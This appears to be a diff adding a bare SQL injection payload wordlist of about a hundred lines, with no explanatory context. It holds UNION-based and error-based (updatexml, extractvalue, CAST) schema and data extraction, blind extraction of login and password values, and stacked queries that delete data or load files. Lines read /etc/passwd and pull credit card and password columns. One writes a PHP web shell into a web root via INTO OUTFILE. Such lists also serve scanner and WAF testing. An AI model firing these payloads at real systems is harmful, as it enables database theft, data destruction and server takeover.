@@ -1,0 +1,100 @@
+-1 union distinct all select table_name from information_schema.tables
+-1 union all distinct select table_name from information_schema.tables
+-1 union all select table_name from information_schema.tables
+if(1, -1, 2) union select table_name from information_schema.tables limit 1
+if((1), -1, 2) union select table_name from information_schema.tables limit 1
+if(1=2, -1, 2) union select table_name from information_schema.tables limit 1
+true in(2, (select 2)) union select table_name from information_schema.tables limit 1
+true in(2, 1) union select table_name from information_schema.tables limit 1
+if(1, 1, 2) union select 3
+if(sin(1), 1, 2) union select 3
+if(1, sin(1), 2) union select 3
+if(1 - sin(1), 2) union select 3
+if((1), 1, 2) union select 3
+if(-(1), 1, 2) union select 3
+1; if exists ( /* anything */
+union (select 1)--
+union all (select 1)--
+union all (select distinct 1)--
+union (select 1,2,3,4,5)--
+union (select -1,2,3,4,5)--
+union (select -(1),2,3,4,5)--
+union (select -sin(1),2,3,4,5)--
+1;call p(@version, @a)
+1;load data infile "foo"
+1;load xml infile "foo"
+1;load xml local infile "foo"
+1;load xml low_priority infile "foo"
+1;load xml concurrent infile "foo"
+1; delete from foo
+1; delete low_priority from foo
+1; delete quick from foo
+1; delete ignore from foo
+1;do (1=1)
+-0b01 for update union select table_name from information_schema.tables limit 1
+binary _latin1 'true' COLLATE latin1_german2_ci is not unknown union select table_name from information_schema.tables
+binary true COLLATE latin1_german2_ci union select table_name from information_schema.tables
+1<binary 1>2 union select table_name from information_schema.tables limit 1
+binary 1 < binary 2 > binary 3 union select table_name from information_schema.tables limit 1
+binary (false) union select table_name from information_schema.tables limit 1
+1 - binary (false) union select table_name from information_schema.tables limit 1
+1 - (binary (false)) union select table_name from information_schema.tables limit 1
+binary binary 1 union select table_name from information_schema.tables
+binary -1 union select table_name from information_schema.tables
+binary -(1) union select table_name from information_schema.tables
+binary (binary 1) union select table_name from information_schema.tables
+binary (binary 1) union select table_name from information_schema.tables
+\1=\1AND\1=\1;
+\%250=\-1AND\*1=\/1
+1 procedure analyse() union select table_name from information_schema.tables limit 1
+(1)mod @a or 1 union select load_file('/etc/passwd'),credit_card,passwd from users-- -
+@a mod (1) or 1 union select load_file('/etc/passwd'),credit_card,passwd from users-- -
+-1 procedure analyse(1gfsdgfds, sfg) union select table_name from information_schema.tables limit 1
+(select 1 foo) union select load_file('foo');
+'s' || binary(1)# and n='foo"
+1 - binary (1 - binary(1)) UNION SELECT 2 --
+1 - binary (binary(1) -1) UNION SELECT 2 --
+binary (1 - binary(1)) UNION SELECT 2 --
+binary (binary(1) - 1) UNION SELECT 2 --
+binary (binary(1)) UNION SELECT 2 --
+(1 between @version and "2") & 1 UNION SELECT 1
+(1 between @version and @user) & 1 UNION SELECT 1
+(1 between 1 and @version) & 1 UNION SELECT 1
+(1 between '1' and @version) & 1 UNION SELECT 1
+(1 between 1 and 2) & 1 UNION SELECT 1
+(1 between '1' and '2') & 1 UNION SELECT 1
+(1 between 1 and '2') & 1 UNION SELECT 1
+(1 between '1' and 2) & 1 UNION SELECT 1
+('1' between '1' and '2') & 1 UNION SELECT 1
+(@version between '1' and '2') & 1 UNION SELECT 1
+(@version between 1 and '2') & 1 UNION SELECT 1
+1 - ANY(SELECT 1,2)
+ANY(SELECT 1) - 1 UNION ALL --
+ANY(SELECT (1)) - 1 UNION ALL --
+ANY((SELECT 1)) - 1 UNION ALL --
+1 - ANY(SELECT 1) UNION ALL --
+1%A0UNION%A0SELECT%A02--
+1%00UNION%00SELECT%002--
+stringindatasetchoosen%25' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS where FULL_NAME like '%25dministrator' and rownum<=1 and PASSWORD like '0%25') and '1%25'='1
+-{``.``.id} union select table_name FROM information_schema.tables LIMIT 1
+AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-
+AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
+AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
+AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
+AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
+ND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--
+AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
+AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
+AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
+AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--
+AND MAKE_SET(YOLO<(SELECT(length(version()))),1)
+AND MAKE_SET(YOLO<ascii(substring(version(),POS,1)),1)
+AND MAKE_SET(YOLO<(SELECT(length(concat(login,password)))),1)
+AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)
+select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#
+(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#
+SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"']         
+,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)
+,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
+,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name=data_column+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
+,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)
